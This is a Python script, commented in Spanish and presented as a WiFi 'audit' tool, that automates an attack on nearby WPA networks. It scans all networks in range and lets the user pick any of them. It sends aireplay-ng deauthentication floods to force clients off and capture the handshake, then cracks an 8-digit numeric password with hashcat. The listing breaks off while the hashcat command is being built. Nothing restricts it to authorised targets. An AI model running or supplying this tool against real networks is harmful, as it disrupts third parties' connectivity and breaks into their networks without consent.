#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║           WIFI AUDIT TOOL v1.0                              ║
║  Auditoría automatizada de redes WiFi                       ║
║                                                              ║
║  Flujo:                                                      ║
║   1. Identificar interfaces WiFi                             ║
║   2. Elegir interfaz y activar modo monitor                  ║
║   3. Escanear redes y mostrar las de mayor intensidad        ║
║   4. Seleccionar redes a auditar desde lista numerada        ║
║   5. Capturar handshake (airodump-ng + aireplay-ng)          ║
║   6. Convertir .cap a .hc22000 (hcxpcapngtool)               ║
║   7. Crackear con hashcat (mascara 8 digitos numericos)      ║
║   8. Mostrar/guardar password o limpiar y continuar          ║
║                                                              ║
║  Requiere: python3, aircrack-ng, hcxpcapngtool, hashcat      ║
║  Ejecutar: sudo python3 auditar_wifi.py                      ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
# Global variable for monitor interface
_mon_interface_global = None

import sys
import re
import time
import signal
import subprocess
import shlex
from pathlib import Path
from datetime import datetime
import shutil

# =============================================================================
# CONFIGURACION
# =============================================================================

WORK_DIR = Path("/home/lhedwin/Hacking/wifi")
AIRCRACK_DIR = WORK_DIR / "aircrack-ng"
PASSWORDS_FILE = WORK_DIR / "passwords_encontradas.txt"
SCAN_DURATION = 15
DEAUTH_PACKETS = 3
POST_DEAUTH_WAIT = 12

AIRCRACK_DIR.mkdir(parents=True, exist_ok=True)

# =============================================================================
# COLORES PARA TERMINAL
# =============================================================================

class Colors:
    HEADER    = '\033[95m'
    BLUE      = '\033[94m'
    CYAN      = '\033[96m'
    GREEN     = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'


def cprint(msg, color=Colors.ENDC, end='\n'):
    print(f"{color}{msg}{Colors.ENDC}", end=end)


# =============================================================================
# UTILIDADES - EJECUCION DE COMANDOS (sin shell=True para evitar errores zsh)
# =============================================================================

def run_cmd(cmd, timeout=30, capture=True):
    try:
        if isinstance(cmd, str):
            cmd_list = shlex.split(cmd)
        else:
            cmd_list = cmd
        result = subprocess.run(
            cmd_list,
            capture_output=capture,
            text=True,
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except FileNotFoundError:
        return "", "COMANDO_NO_ENCONTRADO", -1
    except Exception as e:
        return "", str(e), -1


def run_bg(cmd, stdout=None, stderr=None):
    if isinstance(cmd, str):
        cmd_list = shlex.split(cmd)
    else:
        cmd_list = cmd
    return subprocess.Popen(
        cmd_list,
        stdout=stdout or subprocess.DEVNULL,
        stderr=stderr or subprocess.DEVNULL
    )


# =============================================================================
# UTILIDADES - VARIAS
# =============================================================================

def sanitize_filename(name):
    safe = re.sub(r'[^\w\-. ]', '_', name)
    safe = re.sub(r'\s+', '_', safe)
    safe = re.sub(r'_+', '_', safe)
    safe = safe.strip('_')
    return safe or "unknown"


def check_tool(tool_name):
    _, _, rc = run_cmd(f"which {tool_name}")
    return rc == 0


# =============================================================================
# FUNCIONES PRINCIPALES
# =============================================================================

def check_dependencies():
    tools = {
        'airmon-ng':      'aircrack-ng',
        'airodump-ng':    'aircrack-ng',
        'aireplay-ng':    'aircrack-ng',
        'hcxpcapngtool':  'hcxtools',
        'hashcat':        'hashcat',
    }
    missing = []
    for tool, pkg in tools.items():
        if not check_tool(tool):
            missing.append(f"{tool} (del paquete {pkg})")
    if missing:
        cprint("\n[!] Herramientas faltantes:", Colors.FAIL)
        for m in missing:
            cprint(f"    - {m}", Colors.FAIL)
        cprint("\n[!] Instalalas con:", Colors.WARNING)
        cprint("    sudo apt update && sudo apt install aircrack-ng hcxtools hashcat", Colors.WARNING)
        sys.exit(1)
    cprint("[*] Todas las herramientas necesarias estan disponibles.", Colors.GREEN)


def check_root():
    if os.geteuid() != 0:
        cprint("\n[!] Este script debe ejecutarse como root.", Colors.FAIL)
        cprint("[!] Usa: sudo python3 auditar_wifi.py\n", Colors.WARNING)
        sys.exit(1)
    cprint("[*] Ejecutando como root.", Colors.GREEN)


# =============================================================================
# PASO 1: IDENTIFICAR INTERFACES
# =============================================================================

def identify_interfaces():
    """
    Identifica las interfaces WiFi usando airmon-ng y iw list.
    Muestra datos completos (PHY, Driver, Chipset, bandas 2.4/5GHz).
    """
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [1] IDENTIFICACION DE INTERFACES WiFi", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    # Ejecutar airmon-ng (sin shell=True, capturamos stderr manualmente)
    proc = subprocess.run(
        shlex.split("airmon-ng"),
        capture_output=True,
        text=True,
        timeout=15
    )
    stdout = proc.stdout  # ignoramos stderr

    interfaces = []
    interfaces_info = {}

    lines = stdout.split('\n')
    header_found = False
    for line in lines:
        if line.strip().startswith('PHY'):
            header_found = True
            continue
        if header_found and line.strip():
            parts = line.split()
            if len(parts) >= 5:
                phy     = parts[0]
                iface   = parts[1]
                driver  = parts[3]
                chipset = ' '.join(parts[4:])
                interfaces.append(iface)
                interfaces_info[iface] = {
                    'phy': phy,
                    'driver': driver,
                    'chipset': chipset,
                }

    # Fallback a iwconfig
    if not interfaces:
        proc2 = subprocess.run(shlex.split("iwconfig"), capture_output=True, text=True, timeout=15)
        stdout2 = proc2.stdout
        current = None
        for line in stdout2.split('\n'):
            if 'IEEE 802.11' in line:
                current = line.split()[0]
                interfaces.append(current)
                interfaces_info[current] = {'phy': 'N/A', 'driver': 'N/A', 'chipset': 'N/A'}

    if not interfaces:
        cprint("[!] No se encontraron interfaces WiFi.", Colors.FAIL)
        sys.exit(1)

    cprint(f"\n[+] Se encontraron {len(interfaces)} interfaz(ces) WiFi:\n")

    # Obtener bandas desde iw list
    proc_iw = subprocess.run(
        shlex.split("iw list"),
        capture_output=True,
        text=True,
        timeout=15
    )
    stdout_iw = proc_iw.stdout  # ignoramos stderr

    phy_bands = {}
    current_phy = None
    for line in stdout_iw.split('\n'):
        m = re.match(r'Wiphy\s+(\S+)', line)
        if m:
            current_phy = m.group(1)
            phy_bands[current_phy] = set()
        if current_phy:
            if '5180 MHz' in line or '5200 MHz' in line or '5500' in line:
                phy_bands[current_phy].add('5GHz')
            if '2412 MHz' in line or '2422 MHz' in line:
                phy_bands[current_phy].add('2.4GHz')

    for i, iface in enumerate(interfaces):
        info = interfaces_info.get(iface, {})
        phy_num = info.get('phy', str(i))
        phy_id = f"phy{phy_num}" if not phy_num.startswith('phy') else phy_num

        cprint(f"  +-- {Colors.BOLD}Interfaz {i+1}: {iface}{Colors.ENDC}", Colors.CYAN)
        cprint(f"  |   PHY:     {phy_id}", Colors.BLUE)
        cprint(f"  |   Driver:  {info.get('driver', 'N/A')}", Colors.BLUE)
        cprint(f"  |   Chipset: {info.get('chipset', 'N/A')}", Colors.BLUE)

        bands = phy_bands.get(phy_id, set())
        supports_24ghz = '2.4GHz' in bands
        supports_5ghz  = '5GHz' in bands

        band_str_list = []
        if supports_24ghz:
            band_str_list.append("2.4GHz")
        if supports_5ghz:
            band_str_list.append("5GHz")
        # Si iw list no detecto ninguna, asumir 2.4GHz
        if not band_str_list:
            band_str_list.append("2.4GHz (por defecto)")

        band_str = ', '.join(band_str_list)

        # Determinar si realmente soporta 5GHz usando iw phy info
        # Buscar frecuencias de 5GHz en el rango 5.x GHz (5000-5999 MHz)
        proc_phy = subprocess.run(
            shlex.split(f"iw phy {phy_id} info"),
            capture_output=True,
            text=True,
            timeout=10
        )
        phy_info = proc_phy.stdout
        # Buscar cualquier frecuencia entre 5000 y 5999 MHz, que indica soporte 5GHz
        if re.search(r'[5-5][0-9]{3}\s*MHz', phy_info):
            supports_5ghz = True
            band_str = '2.4GHz, 5GHz'

        cprint(f"  |   Bandas:  {band_str}", Colors.BLUE)

        if supports_5ghz:
            cprint(f"  |   {Colors.GREEN}*  Soporta 5GHz -> No recomendada para monitor{Colors.ENDC}", Colors.GREEN)
        else:
            cprint(f"  |   {Colors.WARNING}x  NO soporta 5GHz -> Ideal para modo monitor{Colors.ENDC}", Colors.WARNING)

        cprint(f"  +--")

    cprint(f"\n{Colors.BOLD}RECOMENDACION:{Colors.ENDC} Elige la interfaz que NO soporta 5GHz (marcada con x)", Colors.WARNING)
    while True:
        try:
            choice = input(f"\n{Colors.WARNING}[?] Selecciona el numero de interfaz a usar (1-{len(interfaces)}): {Colors.ENDC}")
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                selected = interfaces[idx]
                cprint(f"\n[*] Interfaz seleccionada: {Colors.BOLD}{selected}{Colors.ENDC}", Colors.GREEN)
                return selected
        except (ValueError, IndexError):
            pass
        cprint("[!] Seleccion invalida. Intentando...", Colors.FAIL)


# =============================================================================
# PASO 2: ACTIVAR MODO MONITOR
# =============================================================================

def enable_monitor_mode(interface):
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint(f"  [2] ACTIVANDO MODO MONITOR EN: {interface}", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint(f"[*] Iniciando modo monitor en {interface}...", Colors.CYAN)

    proc = subprocess.run(
        shlex.split(f"airmon-ng start {interface}"),
        capture_output=True,
        text=True,
        timeout=15
    )
    stdout = proc.stdout

    if proc.returncode != 0:
        cprint(f"[!] Error al activar modo monitor: {proc.stderr}", Colors.FAIL)
        sys.exit(1)

    for line in stdout.split('\n'):
        if line.strip():
            cprint(f"  {line}", Colors.BLUE)

    # Detectar el nombre de la interfaz en modo monitor
    proc_iw = subprocess.run(
        shlex.split("iwconfig"),
        capture_output=True,
        text=True,
        timeout=10
    )
    mon_iface = None
    for line in proc_iw.stdout.split('\n'):
        if 'Mode:Monitor' in line:
            mon_iface = line.split()[0]
            break

    if not mon_iface:
        candidate = f"{interface}mon" if not interface.endswith('mon') else interface
        proc_check = subprocess.run(
            shlex.split(f"iwconfig {candidate}"),
            capture_output=True,
            text=True,
            timeout=10
        )
        if proc_check.stdout.strip():
            mon_iface = candidate

    if not mon_iface:
        cprint("[!] No se pudo detectar la interfaz en modo monitor.", Colors.WARNING)
        cprint(f"[!] Asumiendo que es la misma: {interface}", Colors.WARNING)
        mon_iface = interface

    cprint(f"\n[*] Modo monitor activado en: {Colors.BOLD}{mon_iface}{Colors.ENDC}", Colors.GREEN)
    return mon_iface


# =============================================================================
# PASO 3: ESCANEAR REDES
# =============================================================================

def scan_networks(mon_interface):
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [3] ESCANEANDO REDES WiFi", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_prefix = str(WORK_DIR / f"scan_{timestamp}")

    cprint(f"\n[+] Escaneando durante {SCAN_DURATION} segundos. Espera...\n", Colors.CYAN)

    cmd = f"airodump-ng --ignore-negative-one -w {scan_prefix} --output-format csv {mon_interface}"
    proc = run_bg(cmd)

    for remaining in range(SCAN_DURATION, 0, -1):
        print(f"\r   Escaneando... {remaining}s restantes   ", end='', flush=True)
        time.sleep(1)
    print("\r  * Escaneo completado.                        ")

    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    time.sleep(1)

    csv_file = f"{scan_prefix}-01.csv"
    if not os.path.exists(csv_file):
        csv_file = f"{scan_prefix}.csv"

    networks = []
    if not os.path.exists(csv_file):
        cprint("[!] No se genero archivo CSV de escaneo.", Colors.FAIL)
        return networks

    try:
        with open(csv_file, 'r', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        cprint(f"[!] Error leyendo CSV: {e}", Colors.FAIL)
        return networks

    parts = re.split(r'\n\s*\n', content)
    ap_section = parts[0] if parts else ""

    for line in ap_section.split('\n')[1:]:
        line = line.strip()
        if not line or line.startswith('Station MAC') or line.startswith('BSSID,'):
            continue
        fields = line.split(', ')
        if len(fields) < 14:
            continue

        bssid    = fields[0].strip()
        channel  = fields[3].strip()
        privacy  = fields[5].strip()
        power_str = fields[8].strip()
        essid = ', '.join(fields[13:]).strip().rstrip(',').strip('"')

        if not bssid or bssid.startswith('BSSID'):
            continue

        try:
            signal = int(power_str) if power_str not in ('', '-1', 'unknown') else -100
        except ValueError:
            signal = -100

        is_encrypted = 'WPA' in privacy or 'WEP' in privacy

        networks.append({
            'bssid': bssid.upper(),
            'essid': essid if essid else f"<Hidden: {bssid[:8]}>",
            'channel': channel,
            'signal': signal,
            'privacy': privacy,
            'encrypted': is_encrypted,
        })

    # Limpiar archivos temporales del escaneo
    for f in WORK_DIR.glob(f"scan_{timestamp}*"):
        try:
            f.unlink()
        except OSError:
            pass

    networks.sort(key=lambda n: n['signal'], reverse=True)
    encrypted = [n for n in networks if n['encrypted']]

    if not encrypted:
        cprint("\n[!] No se encontraron redes protegidas.", Colors.FAIL)
        return []

    cprint(f"\n[+] Se encontraron {len(encrypted)} redes protegidas.", Colors.GREEN)
    return encrypted


def display_networks(networks, max_show=30):
    cprint("\n" + "-" * 80, Colors.HEADER)
    cprint("  REDES DISPONIBLES (ordenadas por intensidad de senal)", Colors.BOLD)
    cprint("-" * 80, Colors.HEADER)

    cprint(
        f"{'#':<4} {'BSSID':<18} {'CH':<4} {'SENAL':<8} {'PRIVACY':<14} {'ESSID'}",
        Colors.UNDERLINE
    )

    for i, net in enumerate(networks[:max_show]):
        if net['signal'] >= -60:
            sig_color = Colors.GREEN
        elif net['signal'] >= -70:
            sig_color = Colors.CYAN
        elif net['signal'] >= -80:
            sig_color = Colors.WARNING
        else:
            sig_color = Colors.FAIL

        signal_str = f"{net['signal']} dBm" if net['signal'] != -100 else "  ?  "

        line = f"{i+1:<4} {net['bssid']:<18} {net['channel']:<4} "
        cprint(line, end='')
        cprint(f"{signal_str:<8}", color=sig_color, end='')
        cprint(f" {net['privacy']:<14} {net['essid']}")

    if len(networks) > max_show:
        cprint(f"\n[...] Mostrando {max_show} de {len(networks)} redes.", Colors.WARNING)
    else:
        cprint(f"\n[+] Total: {len(networks)} redes mostradas.", Colors.CYAN)

    # Siempre mostrar al menos 10 redes si hay suficientes
    if len(networks) < 10:
        cprint(f"\n[!] Solo se encontraron {len(networks)} redes protegidas.", Colors.WARNING)


# =============================================================================
# PASO 4: SELECCIONAR REDES A AUDITAR (lista numerada)
# =============================================================================

def select_targets(networks):
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [4] SELECCION DE REDES A AUDITAR", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint(f"\n{Colors.BOLD}Redes disponibles (ordenadas por intensidad de senal):{Colors.ENDC}\n")

    cprint(
        f"{'#':<4} {'BSSID':<18} {'CH':<4} {'SENAL':<8} {'PRIVACY':<14} {'ESSID'}",
        Colors.UNDERLINE
    )

    for i, net in enumerate(networks):
        if net['signal'] >= -60:
            sig_color = Colors.GREEN
        elif net['signal'] >= -70:
            sig_color = Colors.CYAN
        elif net['signal'] >= -80:
            sig_color = Colors.WARNING
        else:
            sig_color = Colors.FAIL

        signal_str = f"{net['signal']} dBm" if net['signal'] != -100 else "  ?  "

        line = f"{i+1:<4} {net['bssid']:<18} {net['channel']:<4} "
        cprint(line, end='')
        cprint(f"{signal_str:<8}", color=sig_color, end='')
        cprint(f" {net['privacy']:<14} {net['essid']}")

    cprint(f"\n{Colors.WARNING}[?] Escribe los numeros de las redes a auditar (ej: 1,3,5-8){Colors.ENDC}")
    cprint(f"     {Colors.WARNING}Puedes usar guion para rangos (2-6) y comas para separar.{Colors.ENDC}")
    cprint(f"     {Colors.WARNING}[0] Regresar al menu principal{Colors.ENDC}")

    while True:
        raw = input(f"\n{Colors.WARNING}[?] Tu seleccion: {Colors.ENDC}").strip()

        # Check if user wants to go back to main menu
        if raw.strip() == '0':
            cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
            return None

        selected_indices = set()
        valid = True
        parts = [p.strip() for p in raw.replace(',', ' ').split()]
        for part in parts:
            if '-' in part:
                try:
                    a, b = part.split('-')
                    start, end = int(a.strip()), int(b.strip())
                    if 1 <= start <= end <= len(networks):
                        selected_indices.update(range(start, end + 1))
                    else:
                        valid = False
                        break
                except ValueError:
                    valid = False
                    break
            else:
                try:
                    num = int(part)
                    if 1 <= num <= len(networks):
                        selected_indices.add(num)
                    else:
                        valid = False
                        break
                except ValueError:
                    valid = False
                    break

        if not valid or not selected_indices:
            cprint(f"  [!] Entrada invalida. Usa numeros del 1 al {len(networks)} o 0 para menu principal.", Colors.FAIL)
            continue

        selected_sorted = sorted(selected_indices)
        targets = [networks[i - 1] for i in selected_sorted]
        break

    cprint(f"\n[+] Total de redes a auditar: {Colors.BOLD}{len(targets)}{Colors.ENDC}", Colors.GREEN)
    for t in targets:
        cprint(f"     * {t['essid']} ({t['bssid']}) - CH {t['channel']} - {t['signal']} dBm", Colors.CYAN)

    return targets


# =============================================================================
# PASO 5: CAPTURAR HANDSHAKE
# =============================================================================

def capture_handshake(target, mon_interface):
    essid   = target['essid']
    bssid   = target['bssid']
    channel = target['channel']

    safe_name = sanitize_filename(essid)
    timestamp = datetime.now().strftime("%H%M%S")
    file_prefix = str(WORK_DIR / f"{safe_name}_{timestamp}")

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [5] CAPTURANDO HANDSHAKE", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)
    cprint(f"\n  Red:    {Colors.BOLD}{essid}{Colors.ENDC}", Colors.CYAN)
    cprint(f"  BSSID:  {bssid}", Colors.CYAN)
    cprint(f"  Canal:  {channel}", Colors.CYAN)
    cprint(f"  Senal:  {target['signal']} dBm", Colors.CYAN)

    def check_handshake_exists(cap_path):
        cap_file_candidate = f"{cap_path}-01.cap"
        if not os.path.exists(cap_file_candidate):
            cap_file_candidate = f"{cap_path}.cap"
        if not os.path.exists(cap_file_candidate) or os.path.getsize(cap_file_candidate) == 0:
            return False, cap_file_candidate

        verify_cmd = ["aircrack-ng", cap_file_candidate]
        stdout_v, stderr_v, _ = run_cmd(verify_cmd, timeout=8)
        combined = stdout_v + "\n" + stderr_v
        for line in combined.split('\n'):
            if bssid.upper() in line.upper() and 'handshake' in line.lower():
                m = re.search(r'\((\d+)\s+handshake', line, re.IGNORECASE)
                if m and int(m.group(1)) >= 1:
                    return True, cap_file_candidate

        tshark_out, _, tshark_rc = run_cmd(
            ["tshark", "-r", cap_file_candidate, "-Y",
             f"eapol && wlan.bssid == {bssid.lower()}",
             "-T", "fields", "-e", "frame.number"],
            timeout=8
        )
        if tshark_rc == 0 and tshark_out.strip():
            eapol_frames = [f for f in tshark_out.strip().split('\n') if f.strip()]
            if len(eapol_frames) >= 4:
                return True, cap_file_candidate

        return False, cap_file_candidate

    def sleep_and_check(seconds, cap_path):
        for _ in range(int(seconds)):
            time.sleep(1)
            found, _ = check_handshake_exists(cap_path)
            if found:
                cprint(f"\n{Colors.GREEN}[+] !HANDSHAKE DETECTADO EN TIEMPO REAL! Deteniendo ataques...{Colors.ENDC}", Colors.GREEN)
                return True
        return False

    cmd = f"airodump-ng --ignore-negative-one -c {channel} --bssid {bssid} -w {file_prefix} {mon_interface}"
    cprint(f"\n[*] Iniciando captura enfocada en canal {channel}...", Colors.CYAN)
    airodump_proc = run_bg(cmd)
    
    if sleep_and_check(8, file_prefix):
        pass
    else:
        cprint(f"\n[*] Fase 1: Enviando 5 paquetes de deauth (broadcast)...", Colors.WARNING)
        deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {mon_interface}"
        stdout_deauth, stderr_deauth, _ = run_cmd(deauth_cmd, timeout=25)
        for line in (stdout_deauth + stderr_deauth).split('\n'):
            if line.strip():
                cprint(f"     {line.strip()}", Colors.BLUE)

        cprint("[*] Esperando handshake...", Colors.CYAN)
        if not sleep_and_check(POST_DEAUTH_WAIT + 3, file_prefix):
            csv_file = f"{file_prefix}-01.csv"
            clients_found = []

            if os.path.exists(csv_file):
                try:
                    with open(csv_file, 'r', errors='ignore') as f:
                        csv_content = f.read()

                    csv_parts = re.split(r'\n\s*\n', csv_content)
                    if len(csv_parts) > 1:
                        station_section = csv_parts[1]
                        for line in station_section.split('\n')[1:]:
                            line = line.strip()
                            if not line:
                                continue
                            fields = line.split(', ')
                            if len(fields) >= 6:
                                station_mac = fields[0].strip()
                                station_bssid = fields[5].strip()
                                if station_bssid == bssid and station_mac != bssid.upper():
                                    clients_found.append(station_mac)

                    if clients_found:
                        cprint(f"\n[*] Fase 2: Cliente(s) detectado(s): {', '.join(clients_found[:5])}", Colors.WARNING)
                        for client in clients_found[:5]:
                            deauth_client_cmd = f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} -c {client} {mon_interface}"
                            cprint(f"     Enviando deauth a {client}...", Colors.WARNING)
                            stdout_dc, stderr_dc, _ = run_cmd(deauth_client_cmd, timeout=15)
                            for line in (stdout_dc + stderr_dc).split('\n'):
                                if line.strip():
                                    cprint(f"       {line.strip()}", Colors.BLUE)
                            if sleep_and_check(3, file_prefix):
                                break
                    else:
                        cprint("\n[*] No se encontraron clientes conectados.", Colors.WARNING)
                        cprint("[*] Reintentando deauth broadcast (Fase 2)...", Colors.WARNING)
                        stdout_r, stderr_r, _ = run_cmd(deauth_cmd, timeout=15)
                        for line in (stdout_r + stderr_r).split('\n'):
                            if line.strip():
                                cprint(f"     {line.strip()}", Colors.BLUE)
                        cprint("[*] Esperando handshake (Fase 2)...", Colors.CYAN)
                        sleep_and_check(12, file_prefix)

                except Exception as e:
                    cprint(f"\n[!] Error procesando CSV: {e}", Colors.FAIL)
            else:
                cprint("\n[*] No se encontro archivo CSV de clientes.", Colors.WARNING)
                cprint("[*] Reintentando deauth broadcast (Fase 2)...", Colors.WARNING)
                stdout_r, stderr_r, _ = run_cmd(deauth_cmd, timeout=15)
                for line in (stdout_r + stderr_r).split('\n'):
                    if line.strip():
                        cprint(f"     {line.strip()}", Colors.BLUE)
                cprint("[*] Esperando handshake (Fase 2)...", Colors.CYAN)
                sleep_and_check(12, file_prefix)

            handshake_capturado, _ = check_handshake_exists(file_prefix)
            if not handshake_capturado:
                cprint(f"\n[*] Fase 3: Enviando ultimo intento de deauth broadcast...", Colors.WARNING)
                stdout_f3, stderr_f3, _ = run_cmd(deauth_cmd, timeout=25)
                for line in (stdout_f3 + stderr_f3).split('\n'):
                    if line.strip():
                        cprint(f"     {line.strip()}", Colors.BLUE)
                cprint("[*] Esperando handshake (Fase 3)...", Colors.CYAN)
                sleep_and_check(12, file_prefix)

    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()
    time.sleep(2)

    found_final, cap_file = check_handshake_exists(file_prefix)

    if not os.path.exists(cap_file):
        cprint(f"\n[!] No se genero archivo de captura.", Colors.FAIL)
        return None

    cap_size = os.path.getsize(cap_file)
    cprint(f"\n[*] Archivo de captura: {cap_file} ({cap_size} bytes)", Colors.CYAN)

    cprint("[*] Verificando handshake...", Colors.CYAN)
    has_handshake = found_final
    if has_handshake:
        verify_cmd = ["aircrack-ng", cap_file]
        stdout_verify, stderr_verify, _ = run_cmd(verify_cmd, timeout=15)
        combined_output = stdout_verify + "\n" + stderr_verify
        for line in combined_output.split('\n'):
            if bssid.upper() in line.upper() and line.strip():
                cprint(f"  -> {line.strip()}", Colors.GREEN)

    if has_handshake:
        cprint(f"\n  {Colors.BOLD}[*] WPA HANDSHAKE CAPTURADO EXITOSAMENTE!{Colors.ENDC}", Colors.GREEN)
        return cap_file
    else:
        cprint(f"\n  {Colors.WARNING}[!] No se detecto handshake en la captura.{Colors.ENDC}", Colors.WARNING)
        while True:
            cprint("\n  [?] Que deseas hacer?", Colors.CYAN)
            cprint("      1) Volver al principio para elegir otra red", Colors.CYAN)
            cprint("      2) Regresar al menu principal", Colors.CYAN)
            try:
                try:
                    tty = os.open('/dev/tty', os.O_RDONLY)
                    os.dup2(tty, 0)
                    os.close(tty)
                    import io
                    sys.stdin = open(0, 'r', closefd=False)
                except Exception:
                    pass
                choice = input(f"\n  {Colors.WARNING}[?] Selecciona una opcion (1-2): {Colors.ENDC}").strip()
                
                if choice == "1":
                    cprint("\n  [*] Volviendo al principio para elegir otra red...", Colors.BLUE)
                    return "__VOLVER__"
                elif choice == "2":
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return None
                else:
                    cprint("\n  [!] Opcion no valida. Por favor, selecciona 1 o 2.", Colors.FAIL)
            except (EOFError, KeyboardInterrupt):
                cprint("\n  [!] Entrada no disponible. Saliendo...", Colors.FAIL)
                raise SystemExit(0)

def convert_to_hc22000(cap_file):
    hc22000_file = cap_file.replace('.cap', '.hc22000')

    cprint("\n" + "-" * 50, Colors.HEADER)
    cprint("  [6] CONVIRTIENDO A FORMATO HASHCAT (.hc22000)", Colors.HEADER)
    cprint("-" * 50, Colors.HEADER)

    cprint(f"\n[*] Original: {cap_file}", Colors.CYAN)
    cprint(f"[*] Destino:  {hc22000_file}", Colors.CYAN)

    cmd = f"hcxpcapngtool -o {hc22000_file} {cap_file}"
    stdout, stderr, rc = run_cmd(cmd, timeout=30)

    if rc != 0 or not os.path.exists(hc22000_file) or os.path.getsize(hc22000_file) == 0:
        cprint("[*] Reintentando conversion...", Colors.WARNING)
        cmd2 = f"hcxpcapngtool -o {hc22000_file} -E /dev/null {cap_file}"
        stdout2, stderr2, rc2 = run_cmd(cmd2, timeout=30)
        if rc2 != 0:
            cprint(f"[!] Error en conversion: {stderr2}", Colors.FAIL)
            return None

    if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
        size = os.path.getsize(hc22000_file)
        cprint(f"\n  [*] Archivo .hc22000 generado: {Colors.BOLD}{hc22000_file}{Colors.ENDC}", Colors.GREEN)
        cprint(f"      Tamano: {size} bytes", Colors.GREEN)
        try:
            with open(hc22000_file, 'r') as hf:
                hash_content = hf.readline().strip()
            cprint(f"      Hash: {hash_content[:60]}...", Colors.BLUE)
        except:
            pass
        return hc22000_file
    else:
        cprint("[!] El archivo .hc22000 esta vacio.", Colors.FAIL)
        return None


# =============================================================================

def parse_duration_to_seconds(time_str):
    """Convierte cadenas como '6 mins', '1 hour, 20 mins' o '45 secs' de Hashcat a segundos."""
    total_secs = 0
    time_str = time_str.lower()

    hours = re.search(r'(\d+)\s*hour', time_str)
    mins = re.search(r'(\d+)\s*min', time_str)
    secs = re.search(r'(\d+)\s*sec', time_str)

    if hours: total_secs += int(hours.group(1)) * 3600
    if mins: total_secs += int(mins.group(1)) * 60
    if secs: total_secs += int(secs.group(1))

    return total_secs


# =============================================================================
# PASO 7: CRACKEAR CON HASHCAT
# =============================================================================

def crack_password(hc22000_file, essid):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [7] CRACKEANDO CON HASHCAT", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint(f"\n  Red:     {Colors.BOLD}{essid}{Colors.ENDC}", Colors.CYAN)
    cprint(f"  Archivo: {hc22000_file}", Colors.CYAN)
    cprint(f"  Metodo:  Fuerza bruta - 8 digitos numericos (?d?d?d?d?d?d?d?d)", Colors.CYAN)
    cprint(f"  Modo:    -a 3 (ataque de mascara)", Colors.CYAN)
    cprint(f"  Espacio: 100,000,000 combinaciones posibles\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto.", Colors.WARNING)
        device_args = []
    else:
        cprint(f"  [*] GPU detectada: NVIDIA (Device ID #{device_id})", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return f"{h}h:{m:02d}m:{s:02d}s" if h else f"{m:02d}m:{s:02d}s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = (f"\r  {Colors.CYAN}[{bar}]{Colors.ENDC} {Colors.BOLD}{pct:6.2f}%{Colors.ENDC} "
                    f"{Colors.WARNING}ETA:{Colors.ENDC}{eta_s:10} "
                    f"{Colors.CYAN}T:{Colors.ENDC}{elapsed_s:7} [{status}]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / f"{hc_path.stem}_result.txt"

    cmd = [
        "hashcat", "-m", "22000", "-a", "3",
        hc22000_file,
        "?d?d?d?d?d?d?d?d",
        "-w", "3",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
